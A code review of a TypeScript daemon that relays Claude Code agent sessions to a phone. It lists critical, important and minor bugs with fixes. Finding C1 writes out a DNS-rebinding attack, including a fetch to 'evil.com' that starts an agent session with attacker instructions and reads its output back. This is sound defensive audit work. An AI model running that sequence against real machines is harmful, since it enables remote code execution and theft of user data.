# `packages/daemon` — production-readiness review

Scope: `packages/daemon/src/*.ts` (+ tests). `packages/protocol/src` and `packages/relay/src/{hub,server}.ts`
were read for context only. Verified against `@anthropic-ai/claude-agent-sdk` v0.3.224
(`node_modules/@anthropic-ai/claude-agent-sdk/sdk.d.ts`, `sdk.mjs`).
`npm run test -w @companion/daemon` → 9 files, 60 tests, all passing.

---

### Strengths

- **The port/adapter split is the right architecture.** `agent-sdk-port.ts` keeps `SessionRunner`
  testable against a fake agent while `real-agent-sdk.ts` absorbs the SDK's actual (messy) shape.
  The header comment in `real-agent-sdk.ts:5-32` documenting exactly how the real SDK differs from
  the assumed shape is unusually good engineering hygiene.
- **`finalize()` (session-runner.ts:119) is a genuinely well-designed consolidated teardown.** One
  idempotent path for stop / graceful completion / crash, and it resolves pending permission
  resolvers with a deny before closing so the SDK's `canUseTool` await can't hang. That last detail
  is easy to miss and the SDK explicitly warns about it ("permission prompts have no park deadline",
  sdk.d.ts:1290-1295).
- **`dispatchCommand` shared by HTTP and relay** (`command-dispatcher.ts`) means the two control
  channels cannot drift, with an exhaustive `never` check on the command union.
- **Tests are mostly real, not mock-theatre.** `session-runner.test.ts` drives crash-while-permission-
  pending, double-stop idempotency, graceful stream completion, and pause-suppression through the
  actual runner. `relay-client.test.ts` runs a real `ws` server and asserts real backoff timing.
  `relay-integration.test.ts` wires the actual relay package end to end. `device-auth.test.ts`'s
  `drivePolling` helper correctly avoids the fake-timer ordering trap and explains why.
- **Relay reconnect has an `openConfirmMs` stability window** (`relay-client.ts:99-106`) so an
  auth-rejected connection doesn't reset backoff into a hot loop — a subtle bug that was clearly hit
  and fixed deliberately, with a test.
- **Token-leak defence in `openSocket`** (`relay-client.ts:77-87`) with a test asserting the token
  never reaches a log line.

---

### Critical

#### C1 — The local control surface is unauthenticated and has no `Host` check: DNS-rebinding → arbitrary code execution
`main.ts:34-37`, `http-server.ts:17-95`

`createHttpServer` mounts `POST /sessions`, `/prompt`, `/respond`, `/pause`, `/resume`, `/stop` and
`GET /sessions/:id/events` with **no authentication middleware of any kind**, and `main.ts` starts it
unconditionally on every run (including `npm start`). The README (line 39-41) says "for local
development and testing only… not authenticated and only binds to loopback" — but nothing gates it
off in production, so the production daemon always listens.

Binding to `127.0.0.1` blocks remote network access, and CORS preflight blocks the JSON-body routes
from a plain cross-origin `fetch` (Express answers `OPTIONS` with no `Access-Control-Allow-Origin`).
It does **not** block DNS rebinding: an attacker page on `evil.com` rebinds that hostname to
`127.0.0.1`, after which `http://evil.com:4310` is same-origin to the attacker's script — no
preflight, response readable. Concrete sequence:

1. User visits attacker page; page holds it open.
2. DNS TTL expires, `evil.com` → `127.0.0.1`.
3. `fetch('http://evil.com:4310/sessions', {method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({projectPath:'C:\\Users\\VIGGU', prompt:'<attacker instructions>'})})`.
4. A Claude Code session with full tool access now runs in the user's home directory. The attacker
   reads everything back via `GET /sessions/:id/events` (full assistant text and tool inputs).

Permission prompts are the only remaining barrier, and they are routed to the user's *phone* — plus
any allow-rules already in the user's `~/.claude/settings.json` bypass `canUseTool` entirely. The
bodyless routes (`/pause`, `/stop`) are reachable even without rebinding, via a simple cross-origin
form POST (session id must be guessed — it's a UUID, so that part is fine).

**Fix:** (a) validate `req.headers.host` against `127.0.0.1:PORT` / `localhost:PORT` and reject
otherwise — this alone kills rebinding; (b) require a bearer token minted at startup and written to
the same `~/.companion` dir as the device token; (c) make the surface opt-in
(`COMPANION_DAEMON_HTTP=1`) rather than always-on, since the relay is the production channel.

#### C2 — Every event emitted while the relay socket is not `OPEN` is destroyed, and one class of loss makes a whole session permanently invisible
`relay-client.ts:63-70`, `main.ts:22-37, 39-70`

`sendEvent` logs and returns when `readyState !== OPEN`. There is no outbound buffer, no replay on
reconnect, and no resync request. The relay only persists what it actually receives
(`hub.ts:202 appendSessionEvent`), so a dropped event is gone from the browser's history forever, not
merely delayed.

Two concrete failures:

1. **Dropped `session_started` ⇒ the session never exists for the phone.** `main.ts` calls
   `app.listen()` at line 35 and only *then* `await getOrCreateDeviceToken(...)` — which on a first
   pairing blocks for up to five minutes, and on any restart still blocks for the HTTP round trip
   plus the WS handshake. During that entire window `relayClient` is `undefined`, so
   `relayClient?.sendEvent(...)` (main.ts:30) is a silent no-op that doesn't even log. Start a session
   in that window (or during any reconnect backoff, up to 10 s) and the relay never sees
   `session_started`, so it never creates the session row — and `hub.routeFromDaemon` then throws
   `Unknown session <id>` for **every** subsequent event of that session (hub.ts:192-195). The
   session runs to completion with the phone showing nothing, permanently.
2. **Dropped `permission_request` ⇒ a wedged session with no UI to unwedge it.** The SDK's
   `canUseTool` await has no timeout by design ("permission prompts have no park deadline",
   sdk.d.ts:1293-1295). If the one `permission_request` event lands in a reconnect window, the tool
   stays blocked forever, the runner sits in `waiting_permission` (which also makes `pause` and
   `injectPrompt` throw, session-runner.ts:61, 95), and the phone has no prompt to answer. Only the
   local HTTP surface or a stop can recover it.

**Fix:** buffer outbound events in `RelayClient` (bounded ring, e.g. 500 events / per-session cap)
and flush on `open`; and/or have `SessionRunner` keep a per-session event log the daemon replays on
reconnect (`main.ts` already keeps `eventLog` — it just never resends it). At minimum, do not start
accepting sessions until either the relay is connected or the relay is disabled.

#### C3 — No signal handling: Ctrl-C orphans the Claude Code subprocess and leaves the phone showing a live session
`main.ts:21-84`

The relay package installs `process.on('SIGTERM'|'SIGINT')` (relay/src/main.ts:114-115). The daemon
installs neither. Consequences of a `Ctrl-C` / service stop / `taskkill`:

- `SessionRunner.stop()` is never called, so `agentQuery.close()` never runs. The SDK's `close()` is
  what "terminate[s] the underlying process… cleaning up all resources including… the CLI
  subprocess" (sdk.d.ts:2655-2661). The spawned `claude` CLI child is left to whatever the OS does
  with an orphan — on Windows a `SIGINT`-terminated parent does not reliably take the child with it.
  That orphan still has tool access to the user's project directory.
- No `stopped` event is emitted, so the browser shows the session as running until the relay's 30 s
  orphan grace timer fires (hub.ts:53, 146-164) and *then* pushes "Session stopped" — a
  half-minute of lying, plus a spurious notification.
- The HTTP server is never closed; `app.listen()`'s returned `Server` is discarded at `main.ts:35`,
  so there is no handle to close even if you wanted to.

**Fix:** keep the `Server` handle; add a `shutdown(signal)` that (1) stops accepting HTTP,
(2) `await manager.stopSession(id)` for the active session so `stopped` is emitted and the SDK
subprocess is closed, (3) flushes/awaits the relay send, (4) `relayClient.close()`, (5) exits with a
timeout guard. Mirror the shape already in `relay/src/main.ts`.

#### C4 — All `result` subtypes collapse to `turn_complete`, so a failed session tells the user's phone that Claude is politely waiting for them
`real-agent-sdk.ts:128-129`, `session-runner.ts:204-213`

```ts
case 'result':
  return [{ type: 'turn_complete' }];
```

`SDKResultMessage = SDKResultSuccess | SDKResultError` (sdk.d.ts:4470). `SDKResultError` has
`subtype: 'error_during_execution' | 'error_max_turns' | 'error_max_budget_usd' |
'error_max_structured_output_retries'` plus `is_error`, `stop_reason`, `errors: string[]`,
`permission_denials` (sdk.d.ts:4440-4468). None of that is read.

Downstream, the relay maps `turn_complete` → status `waiting_input` (hub.ts:29) and fires a push
titled **"Claude is waiting for you"** (hub.ts:42). So: the agent hits the max-turns cap, or blows
the USD budget, or dies mid-execution — and the user's phone buzzes to say Claude finished its turn
and is awaiting a reply. The user replies; `injectPrompt` pushes into a query that has already
terminated (or is about to), and the confusion compounds. `SDKResultSuccess.is_error` can also be
`true` on a "success"-subtype result and is likewise ignored.

**Fix:** in `translateSdkMessage`, branch on `message.subtype !== 'success' || message.is_error` and
emit an error-shaped port message carrying `subtype` + `errors.join('; ')` (or `stop_reason`), which
`SessionRunner` maps to the protocol's existing `error` event. `error` already maps to status
`stopped` and a "Session error" push at the relay, which is the correct user-facing outcome.

---

### Important

#### I1 — `pause`/`resume` emit no events; `SessionStatus` is defined in the protocol but never transmitted
`session-runner.ts:90-107`, `protocol/src/events.ts:3-10`

`pause()` sets `_status = 'paused'` and `resume()` sets `'running'`, and neither calls `emit()`.
The `SessionEvent` union has no status-change member, so `SessionStatus` — a first-class exported
type — travels over the wire exactly nowhere. The relay reverse-engineers status from event types
(`STATUS_BY_EVENT_TYPE`, hub.ts:24-32), which has no entry for pausing because no such event exists.

Concrete: user taps Pause on the phone → relay routes `{type:'pause'}` → daemon interrupts the turn
→ **zero events flow back**. The relay's stored status stays `running`, every browser still renders
"running", and the pause button appears to have done nothing. Same for Resume. Additionally
`waiting_input` is never set by the daemon at all — the runner stays `running` after a completed
turn, so `SessionRunner.status` (returned in `POST /sessions`' 201 body) is wrong from the first
turn_complete onward.

**Fix:** add a `status_changed { sessionId, status, at }` event to the protocol and emit it from every
`_status` assignment (a private `setStatus()` setter makes this mechanical and also prevents the
scattered-assignment bugs in I2). Set `waiting_input` on `turn_complete`.

#### I2 — `handlePermissionRequest` has no state guard and can resurrect a stopped session
`session-runner.ts:141-154`

```ts
private handlePermissionRequest(request) {
  this._status = 'waiting_permission';   // unconditional
  this.emit({ type: 'permission_request', ... });
  return new Promise((resolve) => { this.pendingPermissions.set(request.requestId, resolve); });
}
```

Two reachable problems:

- **After `stop()`:** `finalize()` drains `pendingPermissions` and sets `_status = 'stopped'`, but it
  is idempotent-guarded (line 120-122), so it will never run again. If the SDK invokes `canUseTool`
  once more — an in-flight permission control request racing `sdkQuery.close()` — the runner flips
  from `stopped` back to `waiting_permission`, emits a `permission_request` to the phone for a dead
  session, and registers a resolver **nothing will ever resolve**. If the user then answers it,
  `respondToPermission` (line 85-87) sees `_status !== 'stopped'` and sets `_status = 'running'`: a
  fully zombie session. A following `injectPrompt` passes the status checks and then throws
  `Cannot push to a closed AsyncQueue` out of `AsyncQueue.push` (async-queue.ts:7-9) — which, via
  `dispatchCommand`, surfaces to the user as an inscrutable `command_failed`.
- **While `paused`:** a permission request arriving after `pause()` (see I12 — the ordering is not
  guaranteed) silently overwrites `paused`, and answering it leaves the session `running`. The user's
  pause is undone without any signal.

I could not prove the SDK invokes `canUseTool` post-`close()` — the bundle is minified and
`close()` does tear down `pendingControlResponses` — so treat the first scenario's *reachability* as
unconfirmed. The missing guard is unambiguous either way, and the fix is two lines.

**Fix:**
```ts
if (this._status === 'stopped') return Promise.resolve({ approved: false, reason: 'session stopped' });
const previousStatus = this._status;   // restore instead of forcing 'running' in respondToPermission
this._status = 'waiting_permission';
```

#### I3 — `drainMessages`' catch emits `error` even when the session was stopped deliberately
`session-runner.ts:156-174`

```ts
} catch (err) {
  this.emit({ type: 'error', ... });   // no check that finalize() already ran
  this.finalize('crashed');
}
```

`finalize('stopped')` calls `this.agentQuery?.close()` (line 136) while `drainMessages` is suspended
on the iterator's `next()`. If the SDK surfaces that close as a rejection rather than a clean
`done: true`, the catch fires *after* `stopped` was already emitted, producing an ordering the phone
should never see: `stopped` then `error`. The relay maps `error` → status `stopped` **and** a push
notification titled "Session error" (hub.ts:31, 43), so a normal user-initiated Stop would buzz the
user's phone with a failure that didn't happen.

I could not conclusively determine the SDK's close-time iterator behaviour from `sdk.mjs` (minified);
what I did verify is that `close()`'s cleanup explicitly rejects pending control responses with
`Error("Query closed before response received")` and constructs process-exit errors, so a rejecting
path plainly exists in that teardown. The guard is correct regardless of which way the SDK behaves.

**Fix:** `if (this._status === 'stopped') return;` as the first line of the catch (or check a
`finalized` flag), before emitting.

#### I4 — WebSocket close codes are ignored, so a revoked/unpaired daemon reconnects forever in silence
`relay-client.ts:121-128`

```ts
ws.on('close', () => { ... if (this.closed) return; this.scheduleReconnect(); });
```

The `code` and `reason` arguments are dropped. The relay uses meaningful codes: `4401 'Missing
token'` / `4401 'Invalid token'` / `4403 'Device unpaired'` (relay/src/server.ts:377, 382, 391).
After an unpair from Settings, this daemon reconnects every 10 s indefinitely, logging only
"Connected to relay" then a bare close, with no indication anything is wrong. The user sees "daemon
offline" in the web app and the only remedy — delete `~/.companion/daemon-device.json` and restart —
is nowhere surfaced. This matters more given the noted plan to add per-session unpair.

**Fix:** capture `(code, reason)`; on 4401/4403 stop the reconnect loop and log an actionable message;
for 4403 specifically, delete the token file and re-enter `getOrCreateDeviceToken` so the daemon
prints a fresh pairing code instead of dying.

#### I5 — No WebSocket keepalive: a half-open socket silently swallows every event
`relay-client.ts` (whole file); no `ping`/`pong` anywhere in daemon or relay

Laptop sleep/wake, NAT idle timeout, or a Wi-Fi handoff leaves the socket in `readyState === OPEN`
on the daemon side with nothing on the other end. `sendEvent` (line 64) therefore believes it is
connected and `ws.send()`s into the void — no "Dropping event" log, no reconnect scheduled — until
TCP retransmission finally errors out, which on default Linux/Windows settings can take many minutes.
Combined with C2, everything in that window is destroyed. For a product whose entire value is "my
phone shows what my machine is doing", a multi-minute silent blackout is a core failure.

**Fix:** `setInterval` ping every ~30 s with an `isAlive` flag cleared on send and set in the `pong`
handler; on a missed pong call `ws.terminate()` (not `close()`) and let the existing reconnect path
run. Clear the interval in `close()` and in the `'close'` handler.

#### I6 — The relay's error frames are discarded as "unparseable", hiding every server-side rejection
`relay-client.ts:108-119`

The relay replies to a rejected frame with `{ kind: 'error', message }` — "Diagnostic frame —
deliberately not part of the RelayMessage schema" (relay/src/server.ts:404-410). The daemon parses
every inbound frame with `RelayMessage.parse`, so these fail the discriminated union and are logged
as `Received an unparseable frame from the relay` with the message thrown away. This is precisely the
channel that would tell you `Unknown session <id>` in the C2 scenario, or `Session … is already owned
by a different daemon`. Today those diagnoses are unreachable.

**Fix:** try `RelayMessage.parse` first, then fall back to a small `{kind:'error', message}` schema and
`onLog` the message (and consider surfacing it as a `command_failed`/`error` event).

#### I7 — Unbounded memory: `eventLog` and the `sessions` map are never trimmed
`main.ts:24, 27-31`; `session-manager.ts:14, 62-68`

`eventLog.push(event)` runs for every event for the lifetime of the process and is never truncated.
`assistant_text` events carry the model's full output and `tool_use` events carry full tool inputs
(file contents for Write, whole commands for Bash). `SessionManager.sessions` likewise never deletes
a stopped runner — each retains its `AsyncQueue`, its `pendingPermissions` map and its closure over
`onEvent`. A daemon that stays up for a week across dozens of sessions grows monotonically. There is
no eviction anywhere in the package.

**Fix:** cap `eventLog` (ring buffer, or per-session cap with the tail kept for `GET /events`), and
delete stopped runners from `sessions` after a short TTL (keeping just enough to answer late
`command_failed` lookups with a clear "session ended" message).

#### I8 — `app.listen()` has no `error` handler, so a port conflict is an uncaught exception
`main.ts:35-37`

`app.listen(PORT, '127.0.0.1', cb)` returns an `http.Server` that is discarded, and no `'error'`
listener is attached. `EADDRINUSE` (a second daemon instance, or anything else on 4310) is emitted on
that server; an `'error'` event with no listener is rethrown by `EventEmitter`, so the process dies
with a raw Node stack trace rather than "port 4310 is in use — set COMPANION_DAEMON_PORT". Worse, if
this happens *after* a first-run pairing has completed, the user has burned a pairing code on a
process that then crashes.

**Fix:** keep the handle (`const server = app.listen(...)`), attach `server.on('error', ...)` with a
readable EADDRINUSE message and `process.exit(1)`, and reuse the handle for C3's shutdown.

#### I9 — No `unhandledRejection` / `uncaughtException` safety net on a long-running daemon
`main.ts` (whole file); `session-runner.ts:54` `void this.drainMessages()`

`drainMessages` is fire-and-forget. Its `try/catch` covers the iteration, but the catch block itself
calls `this.emit(...)` and `this.finalize(...)`, both of which call `onEvent` → `main.ts`'s handler →
`relayClient?.sendEvent` → `JSON.stringify` + `ws.send`. If any of those throws inside the catch, the
rejection escapes `void drainMessages()` unobserved, and Node ≥15 terminates the process by default.
For a daemon meant to sit running all day next to a live coding session, an unlogged process death is
the worst failure mode there is.

**Fix:** `process.on('unhandledRejection')` / `('uncaughtException')` that log with full context and
attempt the C3 graceful shutdown; and wrap the `onEvent` call in `SessionRunner.emit()` in a
try/catch so a transport failure can never take down the session loop.

#### I10 — Several SDK message types that change what the user should be seeing are silently dropped
`real-agent-sdk.ts:94-133` (`default: return []`)

Verified against the `SDKMessage` union at sdk.d.ts:4184 (38 members; three are handled):

| SDK message | `type` | Consequence of dropping it |
|---|---|---|
| `SDKRateLimitEvent` (4408) | `'rate_limit_event'` | `rate_limit_info.status === 'rejected'` with `resetsAt` and `rateLimitType` means the session is **blocked on a usage limit**. The phone shows "running" indefinitely with no explanation and no reset time. This is the single most common real-world stall and it is invisible. |
| `SDKModelRefusalNoFallbackMessage` (4293) | `'system'` | The model refused and no retry ran. The turn produces nothing; the user sees a session that just stops producing text. |
| `SDKModelRefusalFallbackMessage` (4257) | `'system'` | The session model was silently swapped (`original_model` → `fallback_model`); it also carries `retracted_message_uuids` — messages the daemon has *already forwarded to the phone* that should now be removed. The phone keeps showing retracted content. |
| `SDKCompactBoundaryMessage` (3108) | `'system'` | Context was compacted (`trigger`, `pre_tokens`/`post_tokens`). Useful signal, silently lost. |
| `SDKSystemMessage` subtype `init` (4601) | `'system'` | Carries the SDK's own `session_id`, model, and tool list. Never captured — so the daemon can never resume a session after a restart, and can't tell the user which model is running. |
| `SDKSessionStateChangedMessage` (4562) | — | Its own doc calls `'idle'` "the authoritative turn-over signal", which is a strictly better source for `waiting_input` than inferring from `result`. |
| `SDKAPIRetryMessage`, `SDKPermissionDeniedMessage`, `SDKTaskNotificationMessage`, `SDKMirrorErrorMessage` | — | Transient API retries, denials, background-task completions, mirror errors: all invisible. |

**Fix:** widen the port's `AgentMessage` with a generic `notice { level, text, meta }` (or specific
`rate_limited` / `refusal` / `compacted` members), add a matching protocol event, and translate at
minimum the rate-limit and refusal cases — those two are the difference between "my phone says it's
working" and "it stopped 40 minutes ago".

#### I11 — The `'user'` case also matches `SDKUserMessageReplay`, and tool results lose their tool name
`real-agent-sdk.ts:108-127`

Verified: `SDKUserMessageReplay.type === 'user'` (sdk.d.ts:4818-4820), same discriminant as
`SDKUserMessage`. Replays are emitted when a transcript is replayed; the daemon does not use
`resume` today, so this is latent rather than live — but the moment session resume is added (which
`SDKSystemMessage.session_id` exists for), every replayed tool result will be re-emitted to the phone
as a fresh `tool_result` event and duplicate the whole transcript.

Separately, `toolName: ''` is hardcoded, so every tool result on the phone reads as an unnamed
"tool finished". The comment says the block "only carries `tool_use_id`, not the originating tool's
name" — true, but the adapter already sees the assistant `tool_use` block that minted that id
(line 102-103, which has both `block.id` and `block.name`). A `Map<tool_use_id, name>` maintained in
the closure resolves it exactly. `tool_use_result` (the tool's structured output) is also discarded.

**Fix:** discriminate replays via `isSynthetic`/an explicit guard once resume lands; keep an
id→name map in `realQueryFn`'s closure and populate `toolName` from it.

#### I12 — The pause/`turn_complete` suppression depends on an SDK ordering guarantee I could not find
`session-runner.ts:204-213`, `real-agent-sdk.ts:74-77`

The comment asserts: *"pause() sets `_status` to 'paused' as soon as interrupt() resolves, and the SDK
guarantees the interrupted turn's result message arrives strictly after that."* I searched `sdk.d.ts`
for that guarantee: `Query.interrupt()` (sdk.d.ts:2370) documents only its return value
(`still_queued` uuids on newer CLIs, `undefined` on older), and nothing in the file states any
ordering between the interrupt control response and the aborted turn's `result` message. They travel
on the same transport, and the CLI plausibly emits the `result` *before* it acks the control request.

If that happens: `pause()` is still suspended at `await this.agentQuery.interrupt()` (line 98) so
`_status` is still `'running'`; `drainMessages` concurrently processes the `result`, sees
`_status !== 'paused'`, and emits `turn_complete` — which the relay turns into a **"Claude is waiting
for you"** push (hub.ts:42) the instant the user taps Pause. That is exactly the notification the
comment says this code prevents, and the test at session-runner.test.ts:132 can't catch it because
the mock's `interrupt` resolves immediately and the test pushes the message afterwards.

**Fix:** set the status *before* awaiting, e.g. `this._status = 'paused'` (or a separate `pausing`
flag consulted by `handleMessage`) on the line above `await this.agentQuery.interrupt()`, and roll it
back if `interrupt()` rejects. Then the ordering no longer matters. Add a test whose mock `interrupt`
emits `turn_complete` *before* resolving.

#### I13 — `projectPath` is accepted unvalidated
`http-server.ts:24-27`, `session-manager.ts:22-50`

`StartSessionCommand` validates only `z.string()`. A non-existent path, a file, or a relative path
yields `201 Created` and a session that dies asynchronously somewhere inside the SDK, surfacing as a
generic `error` event minutes later. Given C1, an unvalidated `cwd` is also the lever that makes
rebinding maximally dangerous.

**Fix:** `await stat(projectPath)`, require `isDirectory()` and `isAbsolute()`, and return 400 with a
clear message before creating the runner. Optionally constrain to an allow-list of project roots.

#### I14 — The Express error handler flattens every failure to `400` and echoes raw messages
`http-server.ts:89-92`

`No session with id …` should be 404; a genuine internal failure should be 500; a Zod failure is
correctly 400. Everything is 400, and `err.message` is returned verbatim (Zod's issue dump, or any
internal error text). A client can't distinguish "you asked for something that doesn't exist" from
"the daemon is broken", which makes the web app's retry logic guesswork.

**Fix:** tag domain errors (a small `NotFoundError`/`ConflictError`) and map to 404/409/400/500;
log the full error server-side, return a shaped `{ error: { code, message } }`.

---

### Minor

- **M1 — `mode: 0o600` on the token file is nearly a no-op on Windows.** `device-auth.ts:146`. Node on
  Windows maps only the read-only bit; the file's real protection is the user-profile ACL. The
  project's own environment is win32. `mkdir` (line 145) also creates `~/.companion` with default
  permissions, and `writeFile`'s `mode` applies only at creation — a pre-existing file with wider
  permissions keeps them. Consider tightening the directory ACL explicitly on Windows, or documenting
  the actual guarantee rather than implying POSIX 600.
- **M2 — A corrupt token file bricks the relay connection until manually deleted.** `device-auth.ts:48`.
  A truncated file throws a raw `SyntaxError` from `JSON.parse` (no friendly message, unlike the
  shape check on line 49-51), `main.ts:71-77` catches it, and the daemon then runs relay-less forever
  with no retry. Treat an unreadable/malformed token file as "unpaired" and fall through to
  `pairNewDevice` instead.
- **M3 — `seq: 0` is dead weight.** `relay-client.ts:68`. The relay always overwrites it with a
  store-assigned seq (hub.ts:202-206). Either drop `seq` from the daemon→relay direction of
  `RelayMessage` or make the daemon's value meaningful (it would be genuinely useful for the C2 replay
  fix, as a de-duplication key).
- **M4 — `AsyncQueue` is implicitly single-consumer and undocumented as such.** `async-queue.ts:26-40`.
  Each `[Symbol.asyncIterator]()` returns a fresh object but they all share `values`/`resolvers`, so
  two concurrent consumers silently steal each other's items. There is no `return()`/`throw()`, so
  `break`-ing out of a `for await` doesn't close the queue. The internal invariant (values and
  resolvers are never both non-empty) does hold, and the close-with-buffered-values path drains
  correctly — the implementation is correct for its actual single-consumer use. Just document the
  constraint, or add a `return()` that closes.
- **M5 — `AsyncQueue.push` throwing on a closed queue pushes the race onto every caller.**
  `async-queue.ts:6-9`. `injectPrompt` can reach it during teardown (see I2). A no-op-returning-false
  would be the safer contract here.
- **M6 — `handleMessage`'s `default: break` swallows unknown port types with no log.**
  `session-runner.ts:215-216`. This is exactly how the "every real SDK message is silently dropped"
  bug documented in `real-agent-sdk.ts:26-31` was able to hide. A `console.warn` on the default branch
  costs nothing and would have caught it.
- **M7 — `GET /sessions/:id/events` has no `since`/pagination, and there's no `GET /sessions` or
  `/health`.** `http-server.ts:81-87`. It returns the entire log every call (see also I7), and there's
  no way to ask the daemon "are you alive / what are you running".
- **M8 — `start_session` cannot be issued from the phone.** `command-dispatcher.ts:12-13`, mirrored at
  hub.ts:212. Deliberate and consistent, but it means the phone can only ever attach to a session
  started at the machine — worth confirming that's the intended product boundary long-term.
- **M9 — `resume()` only flips a flag.** `session-runner.ts:102-107`. Nothing is sent to the SDK, so
  after a resume the agent stays idle until a prompt is injected. Combined with I1 (no event), the
  user gets no feedback that resume did anything at all.
- **M10 — Test gaps.** No test touches `main.ts` (wiring, signal handling, listen errors) — the file
  with C1/C3/I7/I8/I9 in it. No test covers event loss across a relay disconnect (the C2 scenario) —
  `relay-client.test.ts` tests that reconnect *happens*, never what happened to events meanwhile.
  `realQueryFn` itself is untested (only the pure `translateSdkMessage` helper): the prompt adapter,
  the three-arg `canUseTool` translation, and the `interrupt`/`close` wiring are exactly the pieces
  the file's own header says were previously wrong, and they have no coverage. `real-agent-sdk.test.ts`
  fixtures are all `as unknown as SDKMessage`, so an SDK type change will not fail the build — a
  compile-time exhaustiveness check over `SDKMessage['type']` would be worth more than the fixtures.

---

### Assessment — production-ready?

**Not yet.** The core design is sound and, in places, notably careful — the port/adapter boundary, the
consolidated idempotent `finalize()`, the shared command dispatcher, and the relay backoff's
`openConfirmMs` stability window are all better than typical for a project at this stage, and the test
suite exercises real lifecycle paths rather than mocking away the subject. But four things stand
between this and running on the author's machine against a real relay. First, the local HTTP surface
is an unauthenticated remote-code-execution primitive: loopback binding plus no `Host` validation is
not a defence against DNS rebinding, and the surface starts unconditionally in production even though
the README describes it as dev-only (C1). Second, the daemon→relay link has no delivery guarantee at
all — anything emitted while the socket is down is destroyed, and one specific loss (`session_started`,
which is trivially reachable because the HTTP server accepts sessions during the entire pairing/connect
window) makes the relay reject every later event for that session, so the session runs to completion
invisible to the phone (C2). Third, there is no signal handling whatsoever, so Ctrl-C orphans the
Claude Code subprocess with live tool access and leaves the phone showing a session that is already
dead (C3). Fourth, every `result` subtype collapses to `turn_complete`, so max-turns, budget, and
execution failures reach the user as "Claude is waiting for you" (C4) — a monitoring product that
reports failures as successes has inverted its own purpose. All four are contained, well-understood
fixes rather than redesigns; C3 and C4 are each an afternoon, C1 is a `Host` check plus a bearer token,
and C2 is a bounded replay buffer in `RelayClient` (the `eventLog` it would replay from already
exists in `main.ts`). I would also treat I1 (pause/resume are invisible to the UI), I4 (an unpaired
daemon retries forever in silence) and I5 (no WebSocket keepalive, so a slept laptop silently swallows
everything) as ship-blockers for the specific promise this product makes, since all three produce a
phone screen that confidently shows the wrong thing. Fix the four Criticals plus those three, and this
package is in good shape.
